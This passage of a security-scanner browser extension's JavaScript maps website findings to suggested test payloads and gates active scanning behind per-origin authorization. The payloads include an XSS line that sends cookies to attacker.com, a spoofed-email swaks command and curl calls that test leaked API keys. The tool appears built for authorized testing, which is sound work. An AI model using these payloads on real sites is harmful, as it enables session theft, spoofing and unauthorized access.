      testNotes: 'Passive recon only. Use findings to prioritize patching and version-specific exploit research.'
    });
  }

  // 8. Insecure Cookies -> Session Hijacking Tests
  const insecureCookies = results.cookies.filter(c => c.status === 'fail');
  if (insecureCookies.length > 0) {
    payloads.push({
      category: 'Session Hijacking (Insecure Cookies)',
      severity: 'medium',
      description: insecureCookies.length + ' cookie(s) missing HttpOnly/Secure flags. Test for theft via XSS or network sniffing.',
      payloads: [
        '<script>document.location="https://attacker.com/steal?c="+document.cookie</script> - Steal via XSS if HttpOnly missing',
        'Test: MITM on HTTP (non-Secure cookie) - Capture cookie in transit',
        'Test: Check if cookie accessible via document.cookie in console (HttpOnly=false)'
      ],
      testNotes: 'Requires XSS vector or network interception. Test in controlled environment.'
    });
  }

  // 9. Missing DMARC/SPF -> Email Spoofing
  if (!results.dns.hasDmarc || !results.dns.hasSpf) {
    payloads.push({
      category: 'Email Spoofing (DMARC/SPF Missing)',
      severity: 'low',
      description: 'Domain lacks SPF and/or DMARC. Email spoofing possible.',
      payloads: [
        'Test: Send spoofed email via: swaks --from victim@' + results.hostname + ' --to target@domain.com --server smtp.attacker.com',
        'Test: Check SPF: dig TXT ' + results.hostname + ' | grep v=spf1',
        'Test: Check DMARC: dig TXT _dmarc.' + results.hostname + ' | grep v=DMARC1',
        'Tool: Use spoofcheck or dmarcian to validate configuration'
      ],
      testNotes: 'Email spoofing test. Requires mail server access. Verify in test environment only.'
    });
  }

  // 10. Exposed Secrets -> Token Abuse
  if (results.secrets && results.secrets.length > 0) {
    payloads.push({
      category: 'Secret / API Key Abuse',
      severity: 'critical',
      description: results.secrets.length + ' exposed secret(s) detected. Test for unauthorized API access.',
      payloads: [
        'For each exposed key: Test API access with: curl -H "Authorization: Bearer <KEY>" https://api.target.com/endpoint',
        'AWS keys: aws sts get-caller-identity --access-key <AKIA...> --secret-key <secret>',
        'GitHub tokens: curl -H "Authorization: token <ghp_...>" https://api.github.com/user',
        'JWT tokens: Decode at jwt.io - check exp, roles, permissions'
      ],
      testNotes: 'IMMEDIATELY REVOKE exposed keys. Test only to verify revocation worked. Do NOT abuse live keys.'
    });
  }

  return payloads;
}

// ---------------------------------------------------------------------------
// 11. Authorization Gate (active scanning is opt-in, per origin)
//     Active scanning SENDS test traffic to the target, so it must never run
//     against an origin the operator has not explicitly confirmed is in-scope.
//     Passive analysis (ANALYZE_SITE) is unaffected and always allowed.
// ---------------------------------------------------------------------------
const AUTH_KEY = 'vyasa_authorized_origins';

function getAuthorizedOrigins() {
  return new Promise((resolve) => {
    if (!chrome.storage || !chrome.storage.local) return resolve({});
    chrome.storage.local.get([AUTH_KEY], (res) => resolve(res[AUTH_KEY] || {}));
  });
}

async function isOriginAuthorized(origin) {
  const map = await getAuthorizedOrigins();
  const entry = map[origin];
  if (!entry) return false;
  if (entry.expires && Date.now() > entry.expires) return false;
  return true;
}

async function setOriginAuthorized(origin, authorized, opts) {
  const map = await getAuthorizedOrigins();
  if (authorized) {
    map[origin] = {
      grantedAt: Date.now(),
      // Authorization auto-expires after 12h so it can't silently persist forever.
      expires: Date.now() + (opts && opts.ttlMs ? opts.ttlMs : 12 * 60 * 60 * 1000),
      includePost: !(opts && opts.includePost === false),
      includeStateChanging: !!(opts && opts.includeStateChanging),
      sqli: !(opts && opts.sqli === false)
    };
  } else {
    delete map[origin];
  }
  return new Promise((resolve) => {
    chrome.storage.local.set({ [AUTH_KEY]: map }, () => resolve(map[origin] || null));
  });
}

// ---------------------------------------------------------------------------
// 12. Active Scan Orchestration
// ---------------------------------------------------------------------------
function applyActiveScoreImpact(baseScore, activeResults) {
  let score = typeof baseScore === 'number' ? baseScore : 100;
  for (const f of activeResults.findings || []) {
    if (f.state === 'confirmed') {
      if (f.severity === 'critical') score -= 25;
      else if (f.severity === 'high') score -= 15;
      else if (f.severity === 'medium') score -= 8;
      else score -= 3;
    } else if (f.state === 'suspected') {
      score -= 3;
    }
  }
  if (activeResults.cors && activeResults.cors.verdict && activeResults.cors.verdict.state === 'confirmed') {
    score -= 15;
  }
  return Math.max(0, Math.min(100, score));
}

// ---------------------------------------------------------------------------
// Behavior-driven route learning: open the page in a background tab, type a
// canary into each SEARCH form, submit it, and capture (via webNavigation) the
// real URL the input produces. This discovers path/query injection points
// generically — no hardcoded route names like "/search/".
// ---------------------------------------------------------------------------
function waitForTabLoad(tabId, ms) {
  return new Promise((resolve) => {
    let done = false;
    const finish = (v) => { if (done) return; done = true; try { chrome.tabs.onUpdated.removeListener(handler); } catch (e) {} resolve(v); };
    const handler = (updatedId, info) => { if (updatedId === tabId && info.status === 'complete') finish(true); };
    try { chrome.tabs.onUpdated.addListener(handler); } catch (e) { resolve(false); return; }
    setTimeout(() => finish(false), ms);
  });
}

function captureNavForCanary(tabId, canary, ms) {
  return new Promise((resolve) => {
    const urls = new Set();
    if (!chrome.webNavigation) { resolve([]); return; }
    const handler = (d) => { if (d.tabId === tabId && d.url && d.url.indexOf(canary) !== -1) urls.add(d.url); };
    const evts = [chrome.webNavigation.onBeforeNavigate, chrome.webNavigation.onCommitted, chrome.webNavigation.onHistoryStateUpdated, chrome.webNavigation.onReferenceFragmentUpdated];
    evts.forEach((e) => { try { e.addListener(handler); } catch (x) {} });
    setTimeout(() => { evts.forEach((e) => { try { e.removeListener(handler); } catch (x) {} }); resolve([...urls]); }, ms);
  });
}

function templateFromObservedUrl(u, canary) {
  const template = u.split(canary).join('{INJECT}');
  let kind = 'path', paramName = null, label = template;
  try {
    const parsed = new URL(u);
    for (const [k, v] of parsed.searchParams.entries()) {
      if (v.indexOf(canary) !== -1) { kind = 'query'; paramName = k; break; }
    }
    if (kind !== 'query' && parsed.pathname.indexOf(canary) !== -1) kind = 'path';
    label = template.split('{INJECT}').join('<term>').replace(parsed.origin, '');
  } catch (e) { /* noop */ }
  return { template, kind, paramName, observedUrl: u, label };
}

async function learnRoutes(targetUrl) {
  const learned = [];
  if (!chrome.tabs || !chrome.tabs.create || !chrome.webNavigation) return learned;
  let tab;
  try { tab = await chrome.tabs.create({ url: targetUrl, active: false }); } catch (e) { return learned; }
  const tabId = tab.id;
  try {
    await waitForTabLoad(tabId, 9000);
    await new Promise((r) => setTimeout(r, 400)); // let content script settle

    let forms = [];
    try { const resp = await chrome.tabs.sendMessage(tabId, { type: 'LIST_SEARCH_FORMS' }); forms = (resp && resp.forms) || []; } catch (e) { forms = []; }
    const count = Math.min(Math.max(forms.length, 0), 3);

    for (let i = 0; i < count; i++) {
      const canary = 'vyl' + Math.random().toString(36).slice(2, 9);
      const capture = captureNavForCanary(tabId, canary, 3800);
      try { await chrome.tabs.sendMessage(tabId, { type: 'SUBMIT_FORM_PROBE', formIndex: i, canary }); } catch (e) { /* noop */ }
      const urls = await capture;
      urls.forEach((u) => learned.push(templateFromObservedUrl(u, canary)));
      if (i < count - 1) {
        try { await chrome.tabs.update(tabId, { url: targetUrl }); await waitForTabLoad(tabId, 9000); await new Promise((r) => setTimeout(r, 300)); } catch (e) { /* noop */ }
      }
    }
  } catch (e) {
    console.warn('[VYASA] route learning notice:', e.message);
  } finally {
    try { await chrome.tabs.remove(tabId); } catch (e) { /* noop */ }
  }

  // Dedupe by template; keep in-scope only.
  const origin = (() => { try { return new URL(targetUrl).origin; } catch (e) { return null; } })();
  const seen = new Set();
  return learned.filter((t) => {
    try { if (new URL(t.observedUrl).origin !== origin) return false; } catch (e) { return false; }
    if (seen.has(t.template)) return false;
    seen.add(t.template);
    return true;
  }).slice(0, 10);
}

// Collect the live attack surface from the page's content script.
async function collectLiveSurface(tabId) {
  let surface = { links: [], forms: [], requests: [] };
  if (tabId) {
    try {
      const s = await chrome.tabs.sendMessage(tabId, { type: 'COLLECT_ATTACK_SURFACE' });
      if (s) surface = s;
    } catch (err) {
      console.warn('[VYASA] attack-surface collection notice:', err.message);
    }
  }
  return surface;
}

// Discovery / recon flow: crawl + robots/sitemap + JS + subdomains.
async function runDiscoveryFlow(url, tabId, opts) {
  if (typeof VYASA_RECON === 'undefined' || !VYASA_RECON.discoverSurface) {
    return { error: 'RECON_ENGINE_UNAVAILABLE' };
  }
  const seed = await collectLiveSurface(tabId);
  const recon = await VYASA_RECON.discoverSurface(url, seed, opts || {});
  return recon;
}

async function runActiveScanFlow(url, tabId, opts) {
  if (typeof VYASA_ACTIVE === 'undefined' || !VYASA_ACTIVE.runActiveScan) {
    return { error: 'ACTIVE_ENGINE_UNAVAILABLE' };
  }
  const origin = (() => { try { return new URL(url).origin; } catch (e) { return null; } })();
  if (!origin) return { error: 'INVALID_URL' };

  const authorized = await isOriginAuthorized(origin);
  if (!authorized) return { error: 'NOT_AUTHORIZED', origin };

  // Pull per-origin scan options stored at authorization time.
  const authMap = await getAuthorizedOrigins();
  const authEntry = authMap[origin] || {};
  const scanOpts = Object.assign({
    sqli: authEntry.sqli !== false,
    includePost: authEntry.includePost !== false,
    includeStateChanging: !!authEntry.includeStateChanging
  }, opts || {});

  // Gather the live attack surface from the page (links, forms, captured requests).
  const discovery = await collectLiveSurface(tabId);

  // Behavior-driven route learning: submit search forms and observe the real
  // injection URL (path or query). This replaces guessing route names.
  try {
    const learnedTemplates = await learnRoutes(url);
    if (learnedTemplates && learnedTemplates.length) discovery.learnedTemplates = learnedTemplates;
  } catch (e) {
    console.warn('[VYASA] learnRoutes failed:', e.message);
  }

  // Fold in endpoints the recon phase already discovered (passed from the popup),
  // so active testing covers the full crawled surface — not just what's linked
  // from the current DOM. This is how the discovered search endpoint gets tested.
  if (opts && Array.isArray(opts.endpoints) && opts.endpoints.length) {
    discovery.endpoints = opts.endpoints;
  } else {
    // No pre-discovery supplied — run recon inline so active scan is still thorough.
    try {
      const recon = await VYASA_RECON.discoverSurface(url, discovery, { subdomains: false });
      if (recon && recon.endpoints) discovery.endpoints = recon.endpoints;
    } catch (e) { /* tolerate */ }
  }

  const activeResults = await VYASA_ACTIVE.runActiveScan(url, discovery, scanOpts);
  activeResults.origin = origin;
  activeResults.scanOpts = { sqli: scanOpts.sqli, includePost: scanOpts.includePost, includeStateChanging: scanOpts.includeStateChanging };
  return activeResults;
}

// 10/13. Unified Message Listener
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'ANALYZE_SITE') {
    analyzeSite(message.url, message.tabId).then(results => {
      sendResponse(results);
    }).catch(err => {
      sendResponse({ error: err.message });
    });
    return true; // Keep channel open
  }

  if (message.type === 'GET_AUTH') {
    isOriginAuthorized(message.origin).then((authorized) => sendResponse({ authorized }));
    return true;
  }

  if (message.type === 'SET_AUTH') {
    setOriginAuthorized(message.origin, message.authorized, message.opts)
      .then((entry) => sendResponse({ ok: true, entry }))
      .catch((err) => sendResponse({ ok: false, error: err.message }));
    return true;
  }

  if (message.type === 'DISCOVER') {
    runDiscoveryFlow(message.url, message.tabId, message.opts)
      .then((results) => sendResponse(results))
      .catch((err) => sendResponse({ error: err.message }));
    return true;
  }

  if (message.type === 'ACTIVE_SCAN') {
    runActiveScanFlow(message.url, message.tabId, message.opts)
      .then((results) => {
        if (!results.error && typeof message.baseScore === 'number') {
          results.adjustedScore = applyActiveScoreImpact(message.baseScore, results);
        }
        sendResponse(results);
      })
      .catch((err) => sendResponse({ error: err.message }));
    return true;
  }
});